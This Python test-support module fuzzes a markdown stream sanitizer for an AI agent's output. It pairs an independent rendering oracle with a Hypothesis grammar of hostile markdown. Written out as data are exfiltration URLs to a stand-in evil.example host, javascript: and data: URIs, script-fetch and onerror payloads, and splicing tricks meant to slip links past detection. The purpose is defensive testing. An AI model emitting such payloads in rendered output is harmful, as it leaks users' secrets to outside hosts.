"""Module E1 test support: a GFM-AST oracle and a grammar of hostile markdown.

The oracle is deliberately independent of the sanitizer (its own URL pattern, a real CommonMark
renderer) so a bug cannot hide behind a shared helper.

Renderer: markdown-it-py in CommonMark mode with raw HTML enabled (as GFM allows) plus the GFM
table and strikethrough rules. Bare-URL autolinking (the GFM "extended autolink" extension) is
checked two ways, and a violation in either fails:

* always, a conservative pattern over the joined text of every run of text nodes outside links
  and code: any `scheme://`, any `www.`, any `mailto:`/`xmpp:`, any `@` followed later in the
  word by a `.` (Unicode/IDN domains and any local part included), any `//host`. That is strictly
  broader than GFM (which needs a boundary before `www.` and a known scheme) and than linkify's
  e-mail rule (ASCII `-;:&=+$,."` local part, IDN domain);
* when `linkify-it-py` is installed, the renderer's own linkify, configured exactly as the
  handoff tells clients to configure it (`fuzzy_link=False`), so every link it creates must be
  allow-listed. Run `uv run --with linkify-it-py pytest packages/core/tests/module_e1` to use it
  before the dev dependency lands.
"""

from __future__ import annotations

import importlib.util
import itertools
import re
from collections.abc import Sequence

from hypothesis import strategies as st
from markdown_it import MarkdownIt
from markdown_it.token import Token

from ragforge_core.agent.sanitize import MarkdownStreamSanitizer

LINKIFY_AVAILABLE = importlib.util.find_spec("linkify_it") is not None


def _renderer() -> MarkdownIt:
    md = MarkdownIt("commonmark", {"html": True, "linkify": LINKIFY_AVAILABLE})
    md.enable(["table", "strikethrough"])
    if LINKIFY_AVAILABLE:  # pragma: no cover - depends on the environment
        md.enable("linkify")
        if md.linkify is not None:  # the client config the E1 handoff recommends
            md.linkify.set({"fuzzy_link": False})
    return md


MD = _renderer()

# Independent of the sanitizer's own pattern on purpose.
_AUTOLINKABLE = re.compile(
    r"(?i)[a-z][a-z0-9+.\-]*://|www\.|(?:mailto|xmpp):|@[^\s@\[\]<>!|`]*\.|//[^\s/]"
)
"""The e-mail alternative stops at `[ ] < > ! |` and backticks: those are punctuation, which
neither linkify's domain grammar (Unicode letters/digits/`-` between dots) nor GFM's
(`[A-Za-z0-9_-]`) ever contains, so `a@evil[.]com` is plain text to every renderer."""

ALLOWED = ("https://docs.example.com/guide", "https://wiki.example.org/Page-1?x=1")
ALLOWED_SPELLINGS = (
    "https://docs.example.com/guide",
    "https://DOCS.Example.com/guide",
    "https://docs.example.com:443/guide",
    "https://user:pw@docs.example.com/guide",
    "https://docs.example.com/guide#intro",
    "https://wiki.example.org/Page-1?x=1",
)
EVIL_URLS = (
    "http://evil.example/steal?d=SECRET",
    "https://evil.example/a.png",
    "HTTPS://EVIL.EXAMPLE/x",
    "//evil.example/x",
    "ftp://evil.example/f",
    "www.evil.example/p",
    "WWW.evil.example",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(document.cookie)",
    "data:text/html;base64,PHNjcmlwdD4=",
    "https://docs.example.com/guide?leak=SECRET",  # allowed host+path, different query
    "https://docs.example.com.evil.example/guide",
    "http://docs.example.com/guide",  # scheme mismatch
    "https://evil.example/`x`",
    "https://evil.example/a)b",
    "me@evil.example",
    "mailto:me@evil.example",
    # linkify links IDN domains, odd local parts and dotless `mailto:` (round-2 P1)
    "a@évil.com",
    "a@evil.рф",
    "me@例え.jp",
    "mailto:;@evil.example?body=SECRET",
    "mailto:a@b",
    "MAILTO:a@localhost",
    'x;$,=&+"@evil.example',
    "xmpp:me@evil.example",
)


# --------------------------------------------------------------------------- oracle
def _allowed_hrefs(allowed: Sequence[str]) -> set[str]:
    return {MD.normalizeLink(url).split("#", 1)[0] for url in allowed}


def _parse(markdown: str) -> list[Token]:
    """A trailing newline never changes what renders, and it sidesteps a markdown-it-py 4.2
    IndexError on a blockquoted table whose last line has no newline (`> |a|\n> |-|\n> `)."""
    return MD.parse(markdown + "\n")


def violations(markdown: str, allowed: Sequence[str] = ALLOWED) -> list[str]:
    """Everything in `markdown` that would render into a fetch or a non-allow-listed link."""
    found: list[str] = []
    hrefs = _allowed_hrefs(allowed)
    for token in _parse(markdown):
        if token.type == "html_block":
            found.append(f"raw HTML block: {token.content!r}")
        if token.type == "inline" and token.children:
            found.extend(_inline_violations(token.children, hrefs))
    return found


def _inline_violations(children: list[Token], hrefs: set[str]) -> list[str]:
    found: list[str] = []
    text: list[str] = []
    depth = 0
    for child in children:
        if child.type == "link_open":
            href = str(child.attrGet("href") or "")
            if href.split("#", 1)[0] not in hrefs:
                found.append(f"non-allow-listed link: {href!r}")
            depth += 1
        elif child.type == "link_close":
            depth -= 1
        elif child.type == "image":
            found.append(f"image: {child.attrGet('src')!r}")
        elif child.type == "html_inline":
            found.append(f"raw HTML: {child.content!r}")
        elif child.type == "text" and depth == 0:
            text.append(child.content)
        else:  # code, breaks, emphasis markers, text inside links: a boundary for autolinking
            text.append("\n")
    for match in _AUTOLINKABLE.finditer("".join(text)):
        found.append(f"autolinkable bare URL in text: {match.group(0)!r}")
    return found


def links(markdown: str) -> list[str]:
    """All hrefs the renderer produces (used to prove allowed links survive)."""
    out: list[str] = []
    for token in _parse(markdown):
        for child in token.children or []:
            if child.type == "link_open":
                out.append(str(child.attrGet("href")))
    return out


# --------------------------------------------------------------------------- driving
def stream(chunks: Sequence[str], allowed: Sequence[str] = ALLOWED) -> list[str]:
    """Feed chunks to a fresh sanitizer; return every emitted event (finish() last)."""
    sanitizer = MarkdownStreamSanitizer()
    sanitizer.allow(allowed)
    events = [sanitizer.feed(chunk) for chunk in chunks]
    events.append(sanitizer.finish())
    return events


def sanitize(text: str, allowed: Sequence[str] = ALLOWED) -> str:
    return "".join(stream([text], allowed))


def split_at(text: str, cuts: Sequence[int]) -> list[str]:
    points = sorted({c for c in cuts if 0 < c < len(text)})
    bounds = [0, *points, len(text)]
    return [text[a:b] for a, b in itertools.pairwise(bounds)]


def group_tokens(tokens: Sequence[str], cut_after: Sequence[bool]) -> list[str]:
    """Join tokens into chunks, cutting after token i when cut_after[i] (token boundaries)."""
    chunks: list[str] = []
    current = ""
    for index, token in enumerate(tokens):
        current += token
        if index < len(cut_after) and cut_after[index]:
            chunks.append(current)
            current = ""
    chunks.append(current)
    return chunks


# --------------------------------------------------------------------------- grammar
Tokens = list[str]

urls = st.sampled_from(EVIL_URLS + ALLOWED_SPELLINGS)
words = st.text(alphabet="abcdefgwxyz0123456789", min_size=1, max_size=8)
punct = st.sampled_from([*"*_~#.,:;()\"'&=+-/{}^%$@?", "\\"])
escapes = st.sampled_from(list("[]()<>!`*_\\|.:/@&")).map(lambda c: "\\" + c)
entities = st.sampled_from(["&#58;", "&#x2F;", "&amp;", "&lt;img src=x&gt;", "&#91;", "&#46;"])
trailing = st.sampled_from(["", ".", ",", ")", "!", "?", "*", "'", "`"])
titles = st.sampled_from(["", ' "t"', " 't'", " (t)", ' "a\\"b"'])
html = st.builds(
    lambda template, url: template.format(url=url),
    st.sampled_from(
        [
            "<img src={url}>",
            '<img src="{url}" onerror=alert(1)>',
            '<a href="{url}">x</a>',
            "<script>fetch('{url}')</script>",
            "<!-- {url} -->",
            "</div>",
            "<iframe src={url}></iframe>",
        ]
    ),
    urls,
)
# Padding lengths straddling the 512-char hold limit (the overflow boundary is where bugs live).
pads = st.sampled_from([0, 1, 250, 495, 500, 505, 509, 510, 511, 512, 513, 600])
backticks = st.integers(min_value=1, max_value=4).map(lambda n: "`" * n)


# Constructs that emit nothing or whose text is re-scanned: spliced INTO a URL/www/e-mail token
# they would glue its halves back together in the rendered text (`ww<javascript:x>w.evil`).
splicers = st.sampled_from(
    [
        "<javascript:x>",
        "<data:x>",
        "<vbscript:x>",
        "<JavaScript:alert(1)>",
        "[](javascript:x)",
        "[](data:x)",
        "[w](http://evil.example)",
        "[](http://evil.example)",
        "[x][r]",
        "\\",
        "&#58;",
        "&#x2F;",
        "<!-- -->",
        "![](x)",
        "<http://zzz>",
        "<a@b.c>",
        "\n[r]: http://evil.example\n",
    ]
)
splice_targets = st.sampled_from(
    [
        *EVIL_URLS,
        "https://evil.example/?d=SECRET",
        "www.evil.example/?d=SECRET",
        "me@evil.example",
        "a@évil.com/?d=SECRET",
        "me@例え.jp",
        "mailto:;@evil.example",
        "mailto:a@b",
        "//evil.example/x",
        "https://docs.example.com/guide",
    ]
)


@st.composite
def spliced(draw: st.DrawFn) -> str:
    """A URL token cut at a random offset with one or two splicers inserted."""
    target = draw(splice_targets)
    cuts = sorted(draw(st.lists(st.integers(0, len(target)), min_size=1, max_size=2)))
    pieces, last = [], 0
    for cut in cuts:
        pieces += [target[last:cut], draw(splicers)]
        last = cut
    pieces.append(target[last:])
    return "".join(pieces)


_leaf = st.one_of(
    spliced(),
    words,
    punct,
    escapes,
    entities,
    html,
    st.builds(lambda url, tail: url + tail, urls, trailing),
    st.builds(lambda url: f"<{url}>", urls),
    st.just("|"),
    st.just(" "),
    st.just("!"),
)


def _wrap_link(inner: str, url: str, title: str, image: bool) -> str:
    return f"{'!' if image else ''}[{inner}]({url}{title})"


inline = st.recursive(
    _leaf,
    lambda children: st.one_of(
        st.builds(_wrap_link, children, urls, titles, st.booleans()),
        st.builds(lambda a, b: f"[{a}][{b}]", children, words),
        st.builds(lambda a: f"[{a}]", children),
        st.builds(lambda a: f"![{a}]", children),
        st.builds(lambda tick, a, tock: f"{tick}{a}{tock}", backticks, children, backticks),
        st.builds(lambda pad, url: f"[{' ' * pad}]({url})", pads, urls),
        st.builds(lambda pad, url: f"{'a' * pad}{url}", pads, urls),
        st.builds(lambda pad, url: f"`{'x' * pad}{url}`", pads, urls),
        st.builds(lambda a, b: a + b, children, children),
        st.builds(lambda a, s, b: a + s + b, children, splicers, children),
    ),
    max_leaves=6,
)


@st.composite
def paragraph(draw: st.DrawFn) -> Tokens:
    tokens: Tokens = []
    for item in draw(st.lists(inline, min_size=1, max_size=8)):
        tokens.append(item)
        tokens.append(draw(st.sampled_from([" ", "", "\n", "  \n"])))
    return tokens


@st.composite
def fence(draw: st.DrawFn) -> Tokens:
    char = draw(st.sampled_from("`~"))
    length = draw(st.integers(3, 5))
    info = draw(st.sampled_from(["", "python", "js `x`", "a`b", "x [a](http://evil.example)"]))
    indent = draw(st.sampled_from(["", "", " ", "    "]))
    body = draw(st.lists(inline, max_size=4))
    close_char = draw(st.sampled_from([char, char, "`" if char == "~" else "~"]))
    close_len = draw(st.integers(2, 6))
    close_indent = draw(st.sampled_from(["", "", "  ", "    "]))
    close_info = draw(st.sampled_from(["", "", " ", " x"]))
    tokens = [indent + char * length + info, "\n"]
    for line in body:
        tokens += [line, "\n"]
    if draw(st.booleans()):
        tokens += [close_indent + close_char * close_len + close_info, "\n"]
    return tokens


@st.composite
def definition(draw: st.DrawFn) -> Tokens:
    label, url = draw(words), draw(urls)
    shape = draw(
        st.sampled_from(["[{l}]: {u}", '[{l}]: <{u}> "t"', "[{l}]:\n  {u}", "[{l}]: {u} x"])
    )
    return [shape.format(l=label, u=url), "\n"]


@st.composite
def table(draw: st.DrawFn) -> Tokens:
    cells = draw(st.lists(inline, min_size=2, max_size=4))
    return ["| a | b |\n|---|---|\n", *[f"| {cell} " for cell in cells], "|\n"]


@st.composite
def contained(draw: st.DrawFn, child: st.SearchStrategy[Tokens]) -> Tokens:
    """Prefix a block's lines with a container marker (and lazy/indented continuation)."""
    first = draw(st.sampled_from(["> ", "- ", "1. ", "* ", "  ", ">", "- > "]))
    rest = draw(st.sampled_from(["> ", "  ", "", "   ", "    "]))
    tokens = draw(child)
    out: Tokens = [first]
    for token in tokens:
        out.append(token.replace("\n", "\n" + rest) if token else token)
    return out


_simple_block = st.one_of(paragraph(), fence(), definition(), table())
block = st.one_of(_simple_block, contained(_simple_block), contained(contained(_simple_block)))


@st.composite
def document(draw: st.DrawFn) -> Tokens:
    tokens: Tokens = []
    for item in draw(st.lists(block, min_size=1, max_size=6)):
        tokens += item
        tokens.append(draw(st.sampled_from(["\n", "\n\n", "\r\n", ""])))
    return tokens
